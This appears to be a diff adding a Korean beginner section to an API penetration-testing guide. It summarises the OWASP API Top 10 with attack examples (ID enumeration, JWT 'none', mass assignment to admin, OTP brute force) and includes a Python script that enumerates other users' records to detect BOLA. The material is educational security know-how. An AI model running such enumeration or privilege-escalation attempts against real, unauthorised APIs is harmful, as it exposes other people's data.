@@ -9,6 +9,112 @@
 
 ---
 
+## 0. 초보자를 위한 개념 이해
+
+### API 보안 테스트란?
+
+API(Application Programming Interface)는 서비스 간 데이터를 교환하는 통로로, 현대 웹 앱의 핵심 구성요소입니다. API 보안 테스트는 이 통로에서 발생하는 인증 우회, 권한 오용, 데이터 노출 등의 취약점을 찾는 작업입니다. 모바일 앱과 SPA(Single Page Application)의 확산으로 API 취약점이 버그바운티에서 가장 높은 보상을 받는 분야가 되었습니다.
+
+**왜 배우는가:**
+```
+API 취약점이 중요한 이유:
+
+  전통적 웹 공격         API 공격
+  ─────────────────────────────────────────
+  HTML 폼 조작           JSON/XML 파라미터 조작
+  쿠키 세션 탈취         JWT/API 키 탈취
+  XSS 삽입               BOLA — 다른 사용자 데이터 접근
+  CSRF                   Mass Assignment — 숨겨진 필드 수정
+
+  API1 BOLA = 버그바운티 최다 보고 취약점
+```
+
+### 핵심 개념 정리
+
+```
+OWASP API Top 10 요약:
+
+  API1  BOLA (IDOR)     — /api/users/123 → /api/users/124 (타인 데이터)
+  API2  인증 취약점      — JWT 알고리즘 none, 브루트포스 가능한 OTP
+  API3  과도한 데이터    — 응답에 password_hash 등 불필요 필드 포함
+  API4  속도 제한 없음   — 무제한 로그인 시도, SMS OTP 완전 브루트포스
+  API5  기능 권한 오류   — 일반 사용자가 DELETE /admin/users 호출 가능
+  API6  Mass Assignment  — {"role": "admin"} 전송 시 권한 상승
+  API7  보안 설정 오류   — CORS * 허용, 상세 에러 메시지 노출
+  API8  인젝션           — SQL/NoSQL/명령어 인젝션
+  API9  자산 관리 부재   — 구버전 /v1/api 보안 패치 미적용
+  API10 로깅 부재        — 공격 시도 탐지/추적 불가
+```
+
+### 필요한 도구 및 환경
+- **Burp Suite**: API 요청 인터셉트 및 수정
+- **httpx / curl**: 명령줄 API 테스트
+- **ffuf**: API 엔드포인트 퍼징 도구
+- **jwt_tool**: JWT 토큰 분석 및 공격 도구
+
+### 기초 실습 예제
+```python
+#!/usr/bin/env python3
+"""API BOLA 취약점 탐지 — 순차 ID 열거 테스트."""
+
+import asyncio
+from dataclasses import dataclass
+
+import httpx
+
+
+@dataclass
+class ApiTestResult:
+    user_id: int
+    status_code: int
+    is_accessible: bool
+    data_preview: str
+
+
+async def test_bola(
+    client: httpx.AsyncClient,
+    base_url: str,
+    my_user_id: int,
+    test_range: range,
+    auth_headers: dict[str, str],
+) -> list[ApiTestResult]:
+    """BOLA 취약점: 다른 사용자 ID로 데이터 접근 가능한지 테스트."""
+    results: list[ApiTestResult] = []
+    for uid in test_range:
+        if uid == my_user_id:
+            continue  # 내 계정은 스킵
+        resp = await client.get(
+            f"{base_url}/api/v1/users/{uid}",
+            headers=auth_headers,
+        )
+        accessible = resp.status_code == 200
+        results.append(ApiTestResult(
+            user_id=uid,
+            status_code=resp.status_code,
+            is_accessible=accessible,
+            data_preview=resp.text[:100] if accessible else "",
+        ))
+    return results
+
+
+if __name__ == "__main__":
+    # 주의: 반드시 허가된 대상에만 사용
+    async def main() -> None:
+        headers = {"Authorization": "Bearer YOUR_JWT_TOKEN"}
+        async with httpx.AsyncClient(verify=False) as client:
+            results = await test_bola(
+                client, "https://target.example.com",
+                my_user_id=42, test_range=range(1, 10),
+                auth_headers=headers,
+            )
+        for r in results:
+            if r.is_accessible:
+                print(f"[BOLA 발견!] user_id={r.user_id}: {r.data_preview}")
+    asyncio.run(main())
+```
+
+---
+
 ## 1. API 정찰 (Reconnaissance)
 
 ### OpenAPI/Swagger 명세 발견
